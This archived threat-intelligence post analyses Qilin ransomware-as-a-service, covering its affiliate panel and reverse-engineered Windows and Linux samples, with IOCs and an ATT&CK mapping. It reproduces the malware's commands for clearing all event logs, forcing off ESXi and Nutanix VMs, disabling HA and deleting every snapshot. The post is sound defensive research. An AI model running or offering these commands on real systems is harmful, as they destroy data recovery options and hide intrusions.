---
layout: post
title: "Ransomware Gangs Collapse as Qilin Seizes Control"
date: 2025-06-17
author: "Mark T. and Evgeny A."
categories: [threat-intelligence, ransomware]
tags: [Qilin, RaaS, ransomware, Windows, Linux, ESXi, Nutanix, MITRE ATT&CK]
---

> **Archival notice:** Originally published by Cybereason on June 17, 2025. This copy is maintained for research and portfolio-archival purposes. The [archived original](https://web.archive.org/web/20260414182741/https://www.cybereason.com/blog/threat-alert-qilin-seizes-control) remains available through the Internet Archive. All rights remain with the original rights holders.

> **Research note:** The analysis and claims below reflect the original publication. Claims made by ransomware operators are presented as claims, not independently verified facts.

The ransomware landscape is undergoing a turbulent realignment, marked by collapses, takeovers, and unexpected internal betrayals.

Once-dominant groups such as RansomHub, LockBit, Everest, and BlackLock have recently suffered abrupt shutdowns, operational failures, and defacements of their dark web infrastructure, revealing deep instability in the cybercriminal ecosystem.

One of the most significant shifts occurred in late March 2025, when RansomHub, widely considered the most active ransomware group of 2024, disappeared without explanation.

The group had risen rapidly by operating a polished Ransomware-as-a-Service (RaaS) model, offering affiliates advanced payloads, reliable payouts, and transparent operations.

Its malware supported cross-platform deployment across Windows, Linux, and ESXi systems.

But just as RansomHub was consolidating its dominance, its leak site vanished.

Days later, rival group DragonForce publicly claimed it had absorbed RansomHub’s infrastructure and affiliates, even integrating the RansomHub logo into its own branding.

Whether this was a hostile takeover, a voluntary merger, or simply opportunistic branding remains unclear—but RansomHub ceased all activity, leaving victims mid-negotiation and sowing confusion.

![RansomHub DLS is offline](/assets/images/qilin/image1.png)

*Figure 1. RansomHub DLS is offline*

In parallel, other ransomware leak sites suffered unexpected disruptions.

Both LockBit and Everest were targeted by anonymous actors signing "XOXO from Prague".

On May 8th, LockBit’s leak site was defaced and replaced with a taunting message: "Don’t do crime.

CRIME IS BAD. xoxo from Prague."

![Everest Ransomware DLS](/assets/images/qilin/image2.png)

*Figure 2. Everest Ransomware DLS*

The attacker leaked a full database dump containing chat transcripts and operational data, which was later confirmed by researchers as authentic, severely damaging LockBit’s internal security reputation.

![LockBit Ransomware DLS defaced with link to database](/assets/images/qilin/image3.png)

*Figure 3. LockBit Ransomware DLS defaced with link to database*

In the case of Everest, however, the incident was limited to a defacement only.

Their Tor-based leak site was similarly replaced with the same mocking message, but no internal data was leaked, and the site went offline shortly after.

While the identity of the group remains unknown, the attacks suggest that ransomware groups themselves are now becoming targets—either of vigilantes, rivals, or external pressure campaigns.

![BlackLock (aka Eldorado, Mamona) Local File Include vulnerability used for credential leak](/assets/images/qilin/image4.png)

*Figure 4. BlackLock (aka Eldorado, Mamona) Local File Include vulnerability used for credential leak*


Another particularly notable case is BlackLock, a mid-sized ransomware operation believed to be a rebrand of the former Eldorado group.

In March 2025, BlackLock was breached by researchers from Resecurity who exploited an LFI vulnerability in its leak site.

They quietly extracted internal data and warned some victims in advance of potential data publication.

Days later, DragonForce publicly defaced the BlackLock site and leaked configuration files, internal chats, and builder artifacts, claiming responsibility for the breach.

However, evidence suggests the action may have been coordinated, as BlackLock’s codebase and DragonForce’s appeared to be nearly identical, and BlackLock’s admin showed no resistance.

This points to either a soft handover or strategic absorption under DragonForce’s expanding umbrella.

![DragonForce DLS is down. (Still down in May)](/assets/images/qilin/image5.png)

*Figure 5. DragonForce DLS is down. (Still down in May)*

Amid these disruptions, a new contender is rising: Qilin.

With a growing presence across forums and ransomware activity trackers, Qilin operates a technically mature infrastructure: payloads built in Rust and C, loaders with advanced evasion features, and an affiliate panel offering Safe Mode execution, network spreading, log cleanup, and automated negotiation tools.

Beyond the malware itself, Qilin offers spam services, PB-scale data storage, legal guidance, and a full set of operational features—positioning itself not just as a ransomware group, but as a full-service cybercrime platform.

As older operations collapse under pressure, betrayal, or reorganization, Qilin is stepping in, not only to fill the void, but to redefine the ransomware-as-a-service model for the next generation of affiliates.

## Overview

Qilin is a ransomware-as-a-service (RaaS) group that has been active since October 2022, steadily building its reputation through a series of high-impact cyberattacks across various industries.

The group operates by providing its ransomware tools and infrastructure to affiliates, taking a 15–20% share of the ransom payments.

## Key Points

- Qilin is emerging as a dominant ransomware group, leveraging custom-built malware written in Rust and C for cross-platform attacks, including Windows, Linux, and ESXi systems. 
- The group’s panel offers advanced features such as customizable encryption modes, safe-mode execution, log cleaning, network spreading, and secure negotiation tools—all designed for affiliate ease and operational stealth. 
- Qilin is expanding its ecosystem with unique offerings like legal and media support, PB-scale data storage, and spam tools—positioning itself not just as a ransomware gang, but as a full-service cybercrime platform.

![A photo of an encrypted host (source: X)](/assets/images/qilin/image6.png)

*Figure 6. A photo of an encrypted host (source: X)*

Qilin has grown increasingly active over the past year, with more than 50 attacks claimed in recent months and over 100 organizations listed on its dark web leak site.

Once they gain access to a network, they steal sensitive data, disrupt systems, and publish stolen information if victims refuse to pay.

Ransom demands usually range from $50,000 to $800,000, making it a flexible and financially motivated threat actor.

![QILIN DLS is Online](/assets/images/qilin/image7.png)

*Figure 7. QILIN DLS is Online*

In February 2024, reports emerged that Qilin was operating a website called “WikiLeaks V2,” where it published data stolen from compromised companies.

![WikiLeaks V2](/assets/images/qilin/image8.png)
*Figure 8.

The last recorded activity on the website was in April 2025.

As of May 2025, the website, which is hosted by OPTIMA LLC.

![Qilin wikileaks v2 project old server information (Shodan)](/assets/images/qilin/image9.png)

*Figure 9. Qilin wikileaks v2 project old server information (Shodan)*

![New Qilin wikileaks v2 project server (Shodan)](/assets/images/qilin/image10.png)

*Figure 10. New Qilin wikileaks v2 project server (Shodan)*

## Qilin Ransomware-as-a-Service Program

On a Russian darknet forum, Qilin ransomware is promoted as a sophisticated Ransomware-as-a-Service (RaaS) solution, offering a comprehensive set of features designed for versatility and effectiveness.

It is marketed as a highly configurable tool capable of adapting to diverse attack scenarios, attracting affiliates with its robust technical capabilities and additional strategic functionalities.

The ransomware employs robust encryption algorithms, including ChaCha20, AES, and RSA-4096, to securely encrypt target data.

Operators can tweak it with four modes: normal, step-skip, fast, and percent, letting them prioritize speed or thoroughness.

A notable feature is the “Call Lawyer” function, which provides legal consultation to increase pressure during ransom negotiations.

Additionally, with network propagation capabilities and a DDoS option introduced in April 2025, Qilin enhances its adaptability for various attack scenarios. 

**Key Options:** 
- Reliable Encryption: Uses ChaCha20, AES, and RSA4096 for unbreakable data locking. 
- Configurable Modes: Four options (normal, step-skip, fast, percent) to balance speed and encryption depth. 
- Legal Assistance: “Call lawyer” feature provides legal consultation to intimidate victims. 
- Network Spreading: Can propagate through networks if credentials are gathered during setup.

Below is detailed information on how the Qilin ransomware is offered as a Ransomware-as-a-Service (RaaS) and its key features.
![QILIN RaaS](/assets/images/qilin/image11.png)
*Figure 11.

Translation:  
**Briefly about the available functionality:**
- Reliable encryption algorithms (chacha20/AES) + RSA4096 
- Configurable encryption modes to balance speed and cryptographic strength 
- 4 software operating modes:   
  ○ normal – fully encrypts the file   
  ○ step-skip – encrypts in chunks with fixed size and skips parts   
  ○ fast – encrypts the beginning of the file   
- percent – encrypts in chunks with fixed size and dynamic skipping, based on file size 
- Ability to reboot the machine into safe-mode with automatic login and file execution 
- Targeted encryption (disks/folders via specified path, remote machines via **IP Address** ) 
- Option to disable filters during file launch if needed (use at your own risk) 
- Kills the most important services and processes for efficient encryption and to prevent decryption 
- Frees up used services and processes after encryption
- Cleans system logs and deletes shadow copies 
- Ability to spread through the network (if credentials were collected during build time) 
- Pre-configured settings in the panel, but allows custom parameters if needed 
- The build does not store all account data for accessing the company’s landing page, which prevents “unauthorized people” from joining the negotiation 
- And many other features you'll learn about during the work process 

**Panel:** 
- Build configurator 
- Guest access (with ability to restrict guest permissions) 
- Full support for negotiations with your targets (you can handle it yourself if preferred) 
- 24/7 services for phone call/SMS spam will also be available

*The software is a unique project, not just another fork of open-source payloads.
The build is written in pure Rust, which gives it speed and security advantages.
For LINUX/ESXI systems, it’s written in pure C.*

Qilin explicitly instructs its affiliates not to target systems located in CIS countries
![QILIN RaaS](/assets/images/qilin/image12.png)
*Figure 12. In March 2023 Group-IB researchers exposed Qilin administrative panel*

The DDOS option was added to the panel in April 2025. 

**Additional most interesting options:** 
![QILIN RaaS](/assets/images/qilin/image14.png)
*Figure 14. New features*
“Qilin has introduced several new features in its latest version: 

- A file storage system with 1 PTb of space will be added.

Upon registration, a certain amount of space will be allocated to you for secure storage and easy further use of data exfiltrated from targets; 
- A tool for spamming corporate email addresses, followed by a tool for spamming phone numbers; 
- An in-house team of journalists who, in cooperation with legal experts, can help you write texts for blog posts and also assist with pressure during negotiations.”

![QILIN RaaS](/assets/images/qilin/image15.png)
*Figure 15. New features*
Translation: 

“A new feature has been added to our **Panel:** legal assistance .

If you need legal consultation regarding your target, simply click the “Call lawyer” button located within the target interface, and our legal team will contact you privately to provide qualified legal support.

The mere appearance of a lawyer in the chat can exert indirect pressure on the company and increase the ransom amount, as companies want to avoid legal proceedings.

The benefits of working with the legal department include:
- Legal assessment of your data; 
- Classification of violations in accordance with applicable legal acts in different jurisdictions; 
- Legal evaluation of potential damages (including lawsuits, legal costs, reputational risks); 
- Ability to conduct direct negotiations between the company and the lawyer; 
- Advice on how to inflict maximum financial damage on the company if it refuses to comply (and how to avoid similar situations in the future).” The heatmap below, which illustrates reported host compromises, indicates that Qilin is intensifying its activity and emerging as a growing threat.

![QILIN Activity (source: ransomware.live)](/assets/images/qilin/image16.png)

*Figure 16. QILIN Activity (source: ransomware.live)*

## Technical Analysis

## Overview

Our team reverse-engineered two samples of the Qilin ransomware: a Rust-based variant targeting Windows and a C-based variant designed for Linux hosts, particularly those running ESXi and other virtualization or server environments.

Our goal is to dissect their functionality, uncover their targeting mechanisms, and highlight key differences in their implementation.

By examining these samples, we aim to provide insights into Qilin’s cross-platform strategies and enhance defenses against this evolving threat.

### Qilin Loader (Windows, Rust Variant)

31c3574456573c89d444478772597db40f075e25c67b8de39926d2faa63ca1d8

![“Detect it Easy” analysis information](/assets/images/qilin/image17.png)

*Figure 17. “Detect it Easy” analysis information*

#### Qilin Loader Operation

Qilin ransomware operates by executing a series of malicious actions on infected systems, all driven by specific command-line parameters, while a password is required to run the sample.

Once executed, it uses tools like PsExec to spread across the network, targeting other domain computers for further infection.

The ransomware also deletes shadow copies, clears windows event logs to cover its tracks, making detection harder for system administrators.

In addition, it runs a PowerShell command to identify and print ransom notes via any discovered printers, further escalating the attack's impact.

The ransomware changes the victim’s desktop wallpaper to deliver its ransom message visually and goes to the extent of **Dismounting disk image** s to prevent access to important files.

Additionally, it installs the Active Directory PowerShell (AD PS) module to exploit domain-level privileges, enhancing its ability to control the environment.

In the final phase, Qilin deletes its own traces by self-deleting after executing all its malicious actions. –

![no-admin flag used when user doesn’t have administrator privileges](/assets/images/qilin/image18.png)

*Figure 18. no-admin flag used when user doesn’t have administrator privileges*

![Embedded ransom note and print option](/assets/images/qilin/image19.png)

*Figure 19. Embedded ransom note and print option*

Qilin runs a PowerShell command to identify and print ransom notes via any discovered printers: 
```pwsh
powershell -Command Get-Printer | Format-List Name, Driver,shared
```
![PsEXEC dropping. PsExec used to spread to domain computers](/assets/images/qilin/image20.png)

*Figure 20. PsEXEC dropping. PsExec used to spread to domain computers*

Below is a list of commands the ransomware is executing during the execution on Windows systems:  
**Events log clear**  
```pwsh
$logs = Get-WinEvent -ListLog * | Where-Object {$_.RecordCount} | Select-Object -ExpandProperty LogName ; ForEach ( $l in $logs | Sort | Get-Unique ) {[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($l)}
```
**Set machine lockscreen image**
```pwsh
REG ADD /v LockScreenImagePath /t REG_SZ /d '' /f ; REG ADD /v LockScreenImageUrl / REG_SZ /d ' /v LockScreenImageStatus /t REG_DWORD /d 1 /f
```
**Installing AD PS module to exploit domain-level privileges, enhancing its ability to control the environment** 
```pwsh
Powershell -Command “ServerManagerCmd.exe -i RSAT-AD-PowerShell;Install-WindowsFeature RSAT-AD-PowerShell;Add-WindowsCapability -Online -Name 'RSAT.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0'-Command "
```
**Self delete command line parameters** 
```pwsh
/C timeout /T 10 & Del
```
**Checking disk image** 
```pwsh
Get-DiskImage -ImagePath '' | Select-Object -ExpandProperty Attached
```
**Dismounting disk image** 
```pwsh
Dismount-DiskImage -ImagePath
```
**Enumerating all domain hosts**
```pwsh
-Command "Import-Module ActiveDirectory ; Get-ADComputer -Filter * | Select-Object -ExpandProperty DNSHostName" 
-Command "Import-Module ActiveDirectory ; Get-ADComputer -Filter * | Where-Object { Test-Connection -ComputerName $_.DNSHostName -Count 1 -Quiet } | ForEach-Object { $_.DNSHostName }"
```
**Enable Safe Mode with Networking if safe mode parameter was set** 
```pwsh
BCDEdit.exe /set {current} safeboot network
```
Additionally the ransomware includes hardcoded (default) blacklist of file extensions that it does not encrypt: 
**File_pattern_black_list:** *"themepack","nls","diapkg", "msi","lnk","exe","scr","bat","drv","rtp","msp","prf","msc","ico","key","o cx","diagcab","dia gcfg","pdb","wpx","hlp","icns","rom","dll","msstyles","mod","ps1","ics" ,"hta","bin","cmd", "ani","386","lock","cur","idx","sys","com","deskthemepack","shs","the me","mpa","nome dia","spl","cpl","adv","icl","msu"*

### Qilin Malicious PowerShell Script

The malware includes a specialized PowerShell script that targets VMware vCenter and ESXi hosts.

Key Capabilities of the Script: 
- Automated vCenter Enumeration: The script deserializes credentials to connect to multiple vCenter servers, logging its actions throughout the process. 
- ESXi Host Discovery and Control: Once connected to a vCenter, it identifies all linked ESXi hosts, changes the root password, and enables SSH access—paving the way for direct command execution. 
- Payload Deployment: A core objective of the script is to upload and execute a malicious payload across all discovered ESXi hosts.
- Root password modifications and SSH activation on all hosts.
- Payload execution on hypervisors.
![Download and Install](/assets/images/qilin/image21.png)
*Figure 21. Downloads and installs the .NET Framework silently*
 
![vCenter ESXi](/assets/images/qilin/image22.png)
*Figure 22. vCenter ESXi hosts enumeration*

![ESXi credential changes](/assets/images/qilin/image23.png)
*Figure 23. ESXi credential changes*

The Qilin Windows variant, written in Rust, is a sophisticated ransomware that requires a password to initiate its malicious operations, leveraging command-line parameters to execute a range of destructive actions.

It spreads across networks using tools like PsExec, exhibiting worm-like capabilities, while deleting shadow copies and clearing Windows event logs to evade detection.

Additionally, it targets VMware environments by enumerating vCenter and ESXi hosts, modifying root passwords, enabling SSH, and deploying payloads across hypervisors, enhancing its reach and impact.

### Qilin Ransomware (Linux, C Variant)

In 2022 and 2023, multiple vendors reported that the Qilin ransomware began targeting not only Windows but also Linux hosts.

To gain a deeper understanding of its behavior and specific targets, we conducted an in-depth analysis of the Linux variant.

Linux sample hash: a7f2a21c0cd5681eab30265432367cf4b649d2b340963a977e70a16738e955a c

![“Detect it Easy” analysis information](/assets/images/qilin/image24.png)

*Figure 24. “Detect it Easy” analysis information*

The analyzed Qilin sample is written in C.

This Linux variant uses no packing or obfuscation, so its malicious intent can be exposed simply by running the strings command.

![strings command output](/assets/images/qilin/image25.png)

*Figure 25. strings command output*

The ransomware sample has an embedded usage help message, possibly for debugging.

The options available are as follows: 
- -d,--debug - Enable debug mode (logging level set to DEBUG, disables backgrounding) 
- --dry-run - Perform scan for files to be processed do not modify them 
- -h,--help - This help 
- -l,--log-level <number> - Set logging level. Values are from 0 for FATAL up to 5 for DEBUG 
- --no-df - Ignore configured white-/black- lists of directories 
- --no-ef - Ignore configured white-/black- lists of extensions 
- --no-ff - Ignore configured white-/black- lists of files 
- --no-proc-kill - Disables process kill 
- ,-R,--no-rename - Disables rename of completed files 
- --no-snap-rm - Disables snapshot deletion 
- --no-vm-kill - Disables VM kill 
- -p,--path <string> - Specifies directory for search (multiple entries allowed, specify this option for each entry) 
- --password <string> - Password for startup 
- -r,--rename - Enables rename of completed files (default) 
- -t,--timer <number> - Enabled timed delay before encryption(seconds) 
- -w,--whitelist - Use whitelists for inclusion instead of blacklists for exclusion (later is default behavior) 
- -y,--yes - Assume answer 'yes' on all questions (script mode) 

The ransomware requires a password as an argument (--password) before proceeding with data encryption.

This is a common technique used to evade dynamic analysis tools, such as sandboxes.

![Input password check switch](/assets/images/qilin/image26.png)

*Figure 26. Input password check switch*

Once the password check succeeds, the ransomware performs analysis of the system it's running on.

The malware calls uname and checks if the malware is running on: 
- Linux 
- ESXi 
- FreeBSD 
- Nutanix 
- “Unknown” (if cannot determine which linux distributive) 
![Linux](/assets/images/qilin/image27.png)

*Figure 27.*
Depending on the detection of ESXi host or Nutanix host, it will perform different actions.

#### ESXi / vSphere

For VMWare ESXi hosts it will execute the following commands: 
```pwsh
for I in $(esxcli storage filesystem list | grep 'VMFS-5' | awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk; vmkfstools -U $I/eztDisk; done for I in $(esxcli storage filesystem list | grep 'VMFS-6' | awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done 
```
The commands above are intended to perform a fix of a known problem on vSphere 7.0 ESXi hosts that leads to memory exhaustion, to ensure system stability during encryption and coverage of older VSphere installations.

Finally, malware optimizes I/O performance during encryption by increasing the buffer-cache size and reducing the flush interval with the following commands: 
```pwsh
esxcfg-advcfg -s 32768 /BufferCache/MaxCapacity 
esxcfg-advcfg -s 20000 /BufferCache/FlushInterval 
```
The enumeration and termination of VM processes on an ESXi host: 
```pwsh
esxcli vm process list 
esxcli vm process kill -t force -w [ID] 
```
Listing all the registered VMs and removing the snapshots are performed with following method: 
```pwsh
vim-cmd vmsvc/getallvms
vim-cmd vmsvc/snapshot.removeall [ID] > /dev/null 2>&1
```
#### Nutanix CVM

If it detects a Nutanix host, it performs the following actions using the Acropolis CLI interface.
```pwsh
Disable High-Availability (HA) restarts by setting its priority to 0.

Disabling HA tells the system not to automatically turn those virtual machines back on if the physical host fails. for vm_id in `acli vm.list | grep -oP '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})' | awk '{print $1}'`; do acli vm.update $vm_id ha_priority=0; done
```
Force power-off all VMs: 
```pwsh
for vm_id in `acli vm.list | grep -oP '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})' | awk '{print $1}'`; do acli vm.force_off $vm_id; done
```
Silent removal of all the snapshots: 
```pwsh
for snap_id in `acli snapshot.list | grep -oP '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})' | awk '{print $1}'`; do echo \"yes\" | acli snapshot.delete $snap_id; done
```
#### Targeted Data

Although this Linux-based sample is clearly aimed at enterprise applications - virtualization platforms like VMware ESXi (and Nutanix), VirtualBox, Xen, and KVM, it still embeds a comprehensive hard-coded list of user-space file extensions and data paths.

Specifically, it encrypts: 

1. Virtualization solution folders:
   - Vmware
   - Virtual Box
   - Xen
   - kvm 2.

2. Database files:
   - Mysql
   - PostgreSQL
   - Redis
   - MongoDB
   - CouchDB
   - neo4j
   - Cassandra
   - Riak
   - influxDB
   - ElasticSearch 3.

3. Containers
   - Docker

Once the malware encrypts all target files, it creates a ransom note file suffixed _RECOVER.txt that contains detailed payment instructions and steps for file recovery.

![Hardcoded ransom note](/assets/images/qilin/image28.png)

*Figure 28. Hardcoded ransom note*

In addition to dropping a ransom notes on disk, the malware also injects its demand into the system’s /etc/motd (Message of the Day), ensuring that every user who logs in via shell is immediately presented with the ransom instructions upon authentication:

![motd injection code](/assets/images/qilin/image29.png)

*Figure 29. motd injection code*

By combining hypervisor directory encryption (with explicit checks for ESXi and Nutanix) and a broad sweep of database and container data, the malware ensures maximum disruption across both virtualized infrastructures and traditional Linux workloads.

## Indicators of Compromise (IOCs)

**IP Address** 
185[.]208.156[.]157 -Ftp data share 
185[.]196.10[.]19 - Ftp data share 
80[.]64.16[.]87 - Wikileaksv2 

**SHA-256** 
Windows version: 
31c3574456573c89d444478772597db40f075e25c67b8de39926d2faa63ca1d8 
C9707a3bc0f177e1d1a5587c61699975b1153406962d187c9a732f97d8f867c5

Linux version: 
13cda19a9bf493f168d0eb6e8b2300828017b0ef437f75548a6c50bfb4a42a09 
a7f2a21c0cd5681eab30265432367cf4b649d2b340963a977e70a16738e955ac

## MITRE ATT&CK Mapping

Tactic | ATT&CK Technique (ID) |
| :--- | :--- |
| **TA0002**: - Execution | **T1569.002**: – System Services: Service Execution | 
| **TA0005**: - Defense Evasion | **T1070.004**: – Indicator Removal: File Deletion | 
| **TA0005**: - Defense Evasion | **T1070.001**: – Indicator Removal: Clear Windows Event Logs |
| **TA0005**: - Defense Evasion | **T1218**: – System Binary Proxy Execution |
| **TA0007**: - Discovery | **T1087**: – Account Discovery |
| **TA0007**: - Discovery | **T1120**: – Peripheral Device Discovery |
| **TA0008**: - Lateral Movement | **T1675**: – ESXi Administration Command |
| **TA0040**: - Impact | **T1486**: – Data Encrypted for Impact |
| **TA0040**: - Impact | **T1490**: – Inhibit System Recovery |


### Selected command examples from the original analysis

The following snippets are reproduced as code for readability. Treat them as indicators of observed behavior, not as commands to run on production systems.

**Printer enumeration (PowerShell)**

```powershell
Get-Printer | Format-List Name, Driver, shared
```

**Windows event-log clearing (PowerShell)**

```powershell
$logs = Get-WinEvent -ListLog * | Where-Object {$_.RecordCount} | Select-Object -ExpandProperty LogName
ForEach ($l in $logs | Sort-Object | Get-Unique) {
  [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($l)
}
```

**Domain host enumeration (PowerShell)**

```powershell
Import-Module ActiveDirectory
Get-ADComputer -Filter * | Select-Object -ExpandProperty DNSHostName
```

**Safe Mode with Networking (Windows)**

```powershell
bcdedit.exe /set {current} safeboot network
```

**Disk-image inspection (PowerShell)**

```powershell
Get-DiskImage -ImagePath '' | Select-Object -ExpandProperty Attached
```

**Disk-image dismount (PowerShell)**

```powershell
Dismount-DiskImage -ImagePath
```

**ESXi VM process enumeration**

```bash
esxcli vm process list
```

**ESXi snapshot management**

```bash
vim-cmd vmsvc/getallvms
vim-cmd vmsvc/snapshot.removeall [ID] > /dev/null 2>&1
```

**ESXi I/O configuration**

```bash
esxcfg-advcfg -s 32768 /BufferCache/MaxCapacity
esxcfg-advcfg -s 20000 /BufferCache/FlushInterval
```

**Nutanix VM enumeration / power operations**

```bash
acli vm.list
acli vm.update <vm_id> ha_priority=0
acli vm.force_off <vm_id>
```
